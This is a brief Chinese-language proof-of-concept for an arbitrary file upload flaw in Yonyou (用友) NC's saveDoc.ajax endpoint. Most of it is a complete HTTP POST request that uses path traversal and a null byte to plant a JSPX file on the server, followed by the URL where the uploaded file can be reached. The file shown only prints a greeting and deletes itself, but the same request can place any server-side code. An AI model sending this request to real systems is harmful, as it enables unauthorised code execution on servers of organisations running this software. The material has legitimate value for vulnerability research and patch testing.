## 用友NC-saveDoc.ajax存在任意文件上传漏洞


## poc
```
POST /uapws/saveDoc.ajax?ws=/../../test2.jspx%00 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Content-Type: application/x-www-form-urlencoded

content=<hi xmlns:hi="http://java.sun.com/JSP/Page">
      <hi:directive.page import="java.util.*,java.io.*,java.net.*"/>
   <hi:scriptlet>
            out.println("Hello World!");new java.io.File(application.getRealPath(request.getServletPath())).delete(); 
   </hi:scriptlet>
</hi>
```

文件路径
```
http://ip/uapws/test2.jspx
```
